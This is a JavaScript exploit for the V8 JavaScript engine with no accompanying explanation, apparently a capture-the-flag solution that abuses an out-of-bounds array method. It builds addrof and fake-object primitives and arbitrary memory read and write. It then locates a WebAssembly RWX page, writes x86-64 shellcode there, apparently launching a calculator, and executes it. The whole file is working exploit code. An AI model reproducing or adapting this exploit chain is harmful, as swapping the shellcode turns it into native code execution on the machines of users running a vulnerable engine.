var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function gethex(val) {
	return "0x"+val.toString(16);
}

var float_arr = [1.1];
var obj = {"A":0x1337};
var obj_arr = [obj];

var float_arr_map_pointer = float_arr.oob();
var obj_arr_map_pointer = ftoi(obj_arr.oob());
console.log("Map pointer leak:"+gethex(ftoi(float_arr_map_pointer)));
console.log("Obj arr map leak:"+gethex(obj_arr_map_pointer));


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var confused_obj = [2.2];
var confused_array = [confused_obj];
var confused_array_map_pointer = confused_array.oob();

function addrof(object) {
	confused_array[0] = object;
	confused_array.oob(float_arr_map_pointer);
	var addr = ftoi(confused_array[0]);
	confused_array.oob(confused_array_map_pointer); // restore back
	return addr;
}

var fake_arr = [1.3];
var fake_arr_map = fake_arr.oob();

function fake_obj(addr) {
	fake_arr[0] = addr;
	fake_arr.oob(confused_array_map_pointer);
	var fake = fake_arr[0];
	fake_arr.oob(fake_arr_map); //restore back
	return fake;
}

var array_of_four = [1.0,1.1,2.2,3.3];
var map_array = array_of_four.oob();
array_of_four[0] = map_array;

var address_arr = addrof(array_of_four);
console.log(gethex(address_arr))

function arb_read(addr) {
	array_of_four[2] = itof(addr);
	fake = fake_obj(itof(address_arr-0x20n));
	return ftoi(fake[0]);	
}

function arb_write(addr,value) {
	array_of_four[2] = itof(addr);
	fake = fake_obj(itof(address_arr-0x20n));
	fake[0] = itof(value);
}

var addr_of_wasm_instance = addrof(wasm_instance);
console.log(gethex(addr_of_wasm_instance));
var rwx_page = arb_read(addr_of_wasm_instance+0x78n);
console.log("Leak rwx: "+gethex(rwx_page));

// copy shellcode
var buf = new ArrayBuffer(0x100);
var dataview = new DataView(buf);
var buf_addr = addrof(buf);
var backing_store_buf_addr = buf_addr+0x10n;

var shellcode = [0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

console.log(gethex(buf_addr));
arb_write(backing_store_buf_addr, rwx_page);
for(var i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4*i,shellcode[i],true);
}
f();
